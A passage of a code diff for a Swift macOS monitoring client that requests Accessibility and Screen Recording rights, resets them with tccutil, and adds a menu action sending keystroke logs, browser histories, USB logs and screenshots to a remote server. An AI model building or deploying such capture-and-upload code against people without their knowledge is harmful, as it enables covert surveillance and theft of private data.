+            1. Open System Settings > Privacy & Security > Accessibility
+            2. Click the lock icon and enter your password
+            3. Click the "+" button and add MonitorClient
+            4. Check the box next to MonitorClient
+            
+            📸 SCREEN RECORDING PERMISSION:
+            1. Open System Settings > Privacy & Security > Screen & System Audio Recording
+            2. Click the "+" button and add MonitorClient
+            3. Check the box next to MonitorClient
+            
+            After granting both permissions, restart the app.
+            """
+        } else if !accessibilityGranted {
+            // Only accessibility needed
+            notification.informativeText = """
+            MonitorClient needs accessibility permission:
+            
+            1. Open System Settings > Privacy & Security > Accessibility
+            2. Click the lock icon and enter your password
+            3. Click the "+" button and add MonitorClient
+            4. Check the box next to MonitorClient
+            
+            After granting permission, restart the app.
+            """
+        } else if !screenRecordingGranted {
+            // Only screen recording needed
+            notification.informativeText = """
+            MonitorClient needs screen recording permission:
+            
+            1. Open System Settings > Privacy & Security > Screen & System Audio Recording
+            2. Click the "+" button and add MonitorClient
+            3. Check the box next to MonitorClient
+            
+            After granting permission, restart the app.
+            """
+        } else {
+            // Both permissions already granted
+            notification.title = "MonitorClient - Permissions Already Granted"
+            notification.informativeText = """
+            ✅ Accessibility: Granted
+            ✅ Screen Recording: Granted
+            
+            All required permissions are already granted.
+            """
+        }
+        
+        notification.soundName = NSUserNotificationDefaultSoundName
+        NSUserNotificationCenter.default.deliver(notification)
+        
+        // Request permissions programmatically
+        if !accessibilityGranted {
+            requestAccessibilityPermission()
+        }
+        
+        if !screenRecordingGranted {
+            requestScreenRecordingPermission()
+        }
+        
+        // Open System Settings to the appropriate section
+        if !accessibilityGranted || !screenRecordingGranted {
+            DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
+                if !accessibilityGranted {
+                    self.openAccessibilityPreferences()
+                } else if !screenRecordingGranted {
+                    self.openScreenRecordingPreferences()
+                }
+            }
+        }
+    }
+    
     // Reset screen recording permissions for testing
     @objc func resetScreenRecordingPermissions() {
         logMessage("Resetting screen recording permission flags", level: .info)
@@ -2792,6 +2961,35 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         storage.removeObject(forKey: "last-screen-recording-check")
         storage.removeObject(forKey: "last-screen-recording-notification")
         logMessage("Screen recording permission flags reset", level: .info)
+    }
+    
+    // Reset screen recording permissions using tccutil (more thorough)
+    @objc func resetScreenRecordingPermissionsSystem() {
+        logMessage("Resetting screen recording permissions using tccutil", level: .info)
+        
+        // Get the bundle identifier
+        let bundleId = Bundle.main.bundleIdentifier ?? "com.unknown.monitorclient"
+        logMessage("Bundle identifier: \(bundleId)", level: .info)
+        
+        // Run tccutil command to reset screen recording permissions
+        let task = Process()
+        task.launchPath = "/usr/bin/tccutil"
+        task.arguments = ["reset", "ScreenCapture", bundleId]
+        
+        do {
+            try task.run()
+            task.waitUntilExit()
+            
+            if task.terminationStatus == 0 {
+                logMessage("Successfully reset screen recording permissions using tccutil", level: .info)
+                // Also reset our local flags
+                resetScreenRecordingPermissions()
+            } else {
+                logMessage("Failed to reset screen recording permissions using tccutil (exit code: \(task.terminationStatus))", level: .error)
+            }
+        } catch {
+            logMessage("Error running tccutil: \(error.localizedDescription)", level: .error)
+        }
     }
     
     // Force request screen recording permission
@@ -3073,67 +3271,6 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         }
     }
     
-    // Test network connectivity to server
-    @objc func testServerConnectivity() {
-        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
-            logError("Cannot test connectivity - invalid endpoint", context: "Connectivity")
-            return
-        }
-        
-        logMessage("Testing connectivity to: \(urlString)", level: .info)
-        
-        var request = URLRequest(url: url)
-        request.httpMethod = "GET"
-        request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
-        request.timeoutInterval = 10.0
-        
-        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
-            DispatchQueue.main.async {
-                if let error = error {
-                    self?.logError("Connectivity test failed: \(error)", context: "Connectivity")
-                    self?.isServerConnected = false
-                    return
-                }
-                
-                if let httpResponse = response as? HTTPURLResponse {
-                    if httpResponse.statusCode == 200 {
-                        self?.logSuccess("Connectivity test successful", details: "HTTP \(httpResponse.statusCode)")
-                        self?.isServerConnected = true
-                    } else {
-                        self?.logError("Connectivity test failed - HTTP \(httpResponse.statusCode)", context: "Connectivity")
-                        self?.isServerConnected = false
-                    }
-                } else {
-                    self?.logError("Connectivity test failed - no HTTP response", context: "Connectivity")
-                    self?.isServerConnected = false
-                }
-            }
-        }
-        task.resume()
-    }
-    
-    @objc private func testSettings() {
-        logMessage("=== Testing Settings ===", level: .info)
-        
-        let settingsPath = getSettingsFilePath()
-        logMessage("Settings file path: \(settingsPath)", level: .info)
-        
-        let fileExists = FileManager.default.fileExists(atPath: settingsPath)
-        logMessage("Settings file exists: \(fileExists)", level: .info)
-        
-        if let settings = NSDictionary(contentsOfFile: settingsPath) {
-            logMessage("Settings loaded: \(settings)", level: .info)
-        } else {
-            logMessage("No settings file found", level: .info)
-        }
-        
-        let currentServerAddress = storage.string(forKey: "server-ip") ?? "Not set"
-        let currentPort = storage.string(forKey: "server-port") ?? "Not set"
-        logMessage("Current server address: \(currentServerAddress)", level: .info)
-        logMessage("Current port: \(currentPort)", level: .info)
-        
-        logMessage("=== End Settings Test ===", level: .info)
-    }
     
 
     
@@ -3192,93 +3329,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMessage("=== End Debug ===", level: .info)
     }
     
-    // Test keyboard monitoring manually
-    @objc func testKeyboardMonitoring() {
-        logMessage("=== Testing Keyboard Monitoring ===", level: .info)
-        
-        // Check permission
-        if isInputMonitoringEnabled() {
-            logMessage("✅ Accessibility permission granted", level: .info)
-            
-            // Try to setup keyboard monitoring
-            setupKeyboardMonitoring()
-            
-            // Check if event tap was created
-            if let tap = eventTap {
-                let isEnabled = CGEvent.tapIsEnabled(tap: tap)
-                logMessage("✅ Event tap created and enabled: \(isEnabled)", level: .info)
-                
-                // Add a test key log
-                let testKeyLog = KeyLog(date: getCurrentDateTimeString(), application: "Test", key: "TEST_KEY")
-                keyLogs.append(testKeyLog)
-                logMessage("✅ Added test key log, total count: \(keyLogs.count)", level: .info)
-                
-            } else {
-                logMessage("❌ Failed to create event tap", level: .error)
-            }
-        } else {
-            logMessage("❌ Accessibility permission not granted", level: .error)
-        }
-        
-        logMessage("=== End Test ===", level: .info)
-    }
     
-    // Test screen recording permission manually
-    @objc func testScreenRecordingPermission() {
-        logMessage("=== Testing Screen Recording Permission ===", level: .info)
-        
-        if #available(macOS 10.15, *) {
-            let isEnabled = CGPreflightScreenCaptureAccess()
-            logMessage("Screen recording permission: \(isEnabled ? "✅ GRANTED" : "❌ DENIED")", level: .info)
-            
-            if isEnabled {
-                logMessage("✅ Screen recording permission granted", level: .info)
-                
-                // Try to take a test screenshot
-                logMessage("Taking test screenshot...", level: .info)
-                TakeScreenShotsAndPost()
-                
-            } else {
-                logMessage("❌ Screen recording permission not granted", level: .error)
-                logMessage("Requesting screen recording permission...", level: .info)
-                requestScreenRecordingPermission()
-            }
-        } else {
-            logMessage("ℹ️  Screen recording permission not required on this macOS version", level: .info)
-        }
-        
-        logMessage("=== End Screen Recording Test ===", level: .info)
-    }
     
-    // Test browser history collection manually
-    @objc func testBrowserHistoryCollection() {
-        logMessage("=== Testing Browser History Collection ===", level: .info)
-        
-        do {
-            let histories = try getBrowserHistories() ?? []
-            logMessage("✅ Collected \(histories.count) browser history entries", level: .info)
-            
-            // Log a sample of the histories
-            let sampleCount = min(3, histories.count)
-            for i in 0..<sampleCount {
-                let history = histories[i]
-                logMessage("Sample history \(i+1): \(history.browser) - \(history.url)", level: .debug)
-            }
-            
-            // Send the histories
-            if histories.count > 0 {
-                sendDataInChunks(data: histories, eventType: "BrowserHistory", chunkSize: 1000)
-                logMessage("✅ Browser histories sent to server", level: .info)
-            } else {
-                logMessage("ℹ️  No browser histories to send", level: .info)
-            }
-            
-        } catch {
-            logError("Failed to collect browser histories: \(error)", context: "BrowserHistoryTest")
-        }
-        
-        logMessage("=== End Browser History Test ===", level: .info)
-    }
     
     // Check app entitlements and provide debugging guidance
     @objc func checkAppEntitlements() {
@@ -3317,96 +3369,65 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMessage("=== End Entitlements Check ===", level: .info)
     }
     
-    // Test server endpoint with a simple key log
-    @objc func testServerEndpoint() {
-        logMessage("=== Testing Server Endpoint ===", level: .info)
+    
+    // Manual send all logs function
+    @objc func sendAllLogs() {
+        logMessage("=== Manual Send All Logs ===", level: .info)
         
-        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
-            logError("Cannot test endpoint - invalid URL", context: "ServerTest")
-            return
-        }
-        
-        logMessage("Testing endpoint: \(urlString)", level: .info)
-        
-        // Prepare test data (matching Windows format)
-        var postData: [String: Any] = [
-            "Event": "KeyLog",
-            "Version": APP_VERSION,
-            "MacAddress": macAddress,
-            "KeyLogs": [
-                [
-                    "date": getCurrentDateTimeString(),
-                    "application": "TestApp (com.test.app)",
-                    "key": "TEST_KEY"
-                ]
-            ]
-                ]
-        
-        // Convert to JSON
-        guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
-            logError("Failed to serialize test JSON data", context: "ServerTest")
-            return
-        }
-        
-        // Create request
-        var request = URLRequest(url: url)
-        request.httpMethod = "POST"
-        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-        request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
-        request.timeoutInterval = 30.0
-        request.httpBody = jsonData
-        
-        logMessage("Sending test request...", level: .info)
-        logMessage("Request body size: \(jsonData.count) bytes", level: .debug)
-        logMessage("Request headers: \(request.allHTTPHeaderFields ?? [:])", level: .debug)
-        
-        // Log the actual JSON being sent
-        if let jsonString = String(data: jsonData, encoding: .utf8) {
-            logMessage("Request JSON: \(jsonString)", level: .debug)
-        }
-        
-        // Send request
-        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+        // Send all types of logs
+        DispatchQueue.global(qos: .background).async {
+            // 1. Send Tic event (heartbeat)
+            do {
+                try self.sendTicEvent()
+                self.logMessage("✅ Tic event sent", level: .info)
+            } catch {
+                self.logError("❌ Tic event failed: \(error)", context: "ManualSend")
+            }
+            
+            // 2. Send browser histories
+            self.sendBrowserHistories()
+            self.logMessage("✅ Browser histories sent", level: .info)
+            
+            // 3. Send key logs
+            self.sendKeyLogs()
+            self.logMessage("✅ Key logs sent", level: .info)
+            
+            // 4. Send USB logs
+            do {
+                try self.sendUSBLogs()
+                self.logMessage("✅ USB logs sent", level: .info)
+            } catch {
+                self.logError("❌ USB logs failed: \(error)", context: "ManualSend")
+            }
+            
+            // 5. Send screenshot
+            if self.isScreenRecordingEnabled() {
+                self.TakeScreenShotsAndPost()
+                self.logMessage("✅ Screenshot sent", level: .info)
+            } else {
+                self.logMessage("⚠️ Screenshot skipped - permission not granted", level: .warning)
+            }
+            
+            self.logMessage("=== All Logs Send Complete ===", level: .info)
+            
+            // Show notification
             DispatchQueue.main.async {
-                if let error = error {
-                    self?.logError("Test request failed: \(error)", context: "ServerTest")
-                    self?.logError("Error details: \(error.localizedDescription)", context: "ServerTest")
-                    return
-                }
-                
-                if let httpResponse = response as? HTTPURLResponse {
-                    self?.logMessage("Test HTTP response: \(httpResponse.statusCode)", level: .info)
-                    self?.logMessage("Response headers: \(httpResponse.allHeaderFields)", level: .debug)
-                    
-                    if httpResponse.statusCode != 200 {
-                        self?.logError("Test HTTP error: \(httpResponse.statusCode)", context: "ServerTest")
-                    }
-                }
-                
-                if let data = data, let responseString = String(data: data, encoding: .utf8) {
-                    self?.logSuccess("Test request successful", details: "Response: \(responseString)")
-                    self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
-                } else {
-                    self?.logError("No response data received for test request", context: "ServerTest")
-                    if let data = data {
-                        self?.logMessage("Raw response data: \(data)", level: .debug)
-                    }
-                }
+                let notification = NSUserNotification()
+                notification.title = "MonitorClient - Manual Send Complete"
+                notification.informativeText = "All monitoring data has been sent to server"
+                notification.soundName = nil
+                NSUserNotificationCenter.default.deliver(notification)
             }
         }
-        task.resume()
-        
-        logMessage("=== End Server Test ===", level: .info)
     }
     
     // MARK: - Status Bar Menu
     
     private func setupStatusBarMenu() {
-        print("Setting up status bar menu...")
+        // Setting up status bar menu
         
         // Create status bar item
         statusBarItem = NSStatusBar.system.statusItem(withLength: NSStatusItem.variableLength)
-        print("Status bar item created")
         
         if let button = statusBarItem?.button {
             button.title = "🗒️"
@@ -3415,9 +3436,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             // Add click action for status bar icon
             button.action = #selector(statusBarIconClicked)
             button.target = self
-            print("Status bar button configured")
+            // Status bar button configured
         } else {
-            print("ERROR: Could not get status bar button")
+            // Error: Could not get status bar button
         }
         
         // Create menu
@@ -3522,17 +3543,15 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         settingsItem.keyEquivalentModifierMask = [.command]
         menu.addItem(settingsItem)
         
-        let openSettingsItem = NSMenuItem(title: "Open Accessibility Settings", action: #selector(openAccessibilityPreferences), keyEquivalent: "")
-        menu.addItem(openSettingsItem)
-        
-        let openScreenRecordingItem = NSMenuItem(title: "Open Screen Recording Settings", action: #selector(openScreenRecordingPreferences), keyEquivalent: "")
-        menu.addItem(openScreenRecordingItem)
+        // Grant permissions (unified button for both accessibility and screen recording)
+        let grantPermissionsItem = NSMenuItem(title: "Grant Permissions", action: #selector(grantAllPermissions), keyEquivalent: "")
+        menu.addItem(grantPermissionsItem)
         
         menu.addItem(NSMenuItem.separator())
         
         // Manual test actions
-        let startupTestItem = NSMenuItem(title: "Run Startup Tests", action: #selector(performStartupTests), keyEquivalent: "")
-        menu.addItem(startupTestItem)
+        let sendAllItem = NSMenuItem(title: "Send All Logs Now", action: #selector(sendAllLogs), keyEquivalent: "")
+        menu.addItem(sendAllItem)
         
         menu.addItem(NSMenuItem.separator())
         
@@ -3641,76 +3660,6 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         NSApplication.shared.terminate(nil)
     }
     
-    // Test server with different data formats
-    @objc func testServerFormats() {
-        logMessage("=== Testing Different Server Formats ===", level: .info)
-        
-        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
-            logError("Cannot test formats - invalid URL", context: "FormatTest")
-            return
-        }
-        
-        // Test 1: Simple Tic event (should work)
-        testFormat(url: url, data: [
-            "Event": "Tic",
-            "Version": APP_VERSION,
-            "MacAddress": macAddress
-        ], name: "Tic Event")
-        
-        // Test 2: Empty KeyLogs array
-        testFormat(url: url, data: [
-            "Event": "KeyLog",
-            "Version": APP_VERSION,
-            "MacAddress": macAddress,
-            "KeyLogs": []
-        ], name: "Empty KeyLogs")
-        
-        // Test 3: Single key log (matching Windows format)
-        testFormat(url: url, data: [
-            "Event": "KeyLog",
-            "Version": APP_VERSION,
-            "MacAddress": macAddress,
-            "KeyLogs": [
-                [
-                    "date": getCurrentDateTimeString(),
-                    "application": "TestApp (com.test.app)",
-                    "key": "A"
-                ]
-            ]
-        ], name: "Single KeyLog")
-        
-        // Test 4: Single browser history (matching Windows format)
-        testFormat(url: url, data: [
-            "Event": "BrowserHistory",
-            "Version": APP_VERSION,
-            "MacAddress": macAddress,
-            "BrowserHistories": [
-                [
-                    "browser": "Safari",
-                    "url": "https://example.com",
-                    "title": "Example Page",
-                    "last_visit": 1234567890,
-                    "date": getCurrentDateTimeString()
-                ]
-            ]
-        ], name: "Single BrowserHistory")
-        
-        // Test 5: Single USB log (matching Windows format)
-        testFormat(url: url, data: [
-            "Event": "USBLog",
-            "Version": APP_VERSION,
-            "MacAddress": macAddress,
-            "USBLogs": [
-                [
-                    "date": getCurrentDateTimeString(),
-                    "device_name": "Test USB Device",
-                    "device_path": "USB Device Path",
-                    "device_type": "USB Device",
-                    "action": "Connected"
-                ]
-            ]
-        ], name: "Single USBLog")
-    }
     
     private func testFormat(url: URL, data: [String: Any], name: String) {
         logMessage("Testing format: \(name)", level: .info)
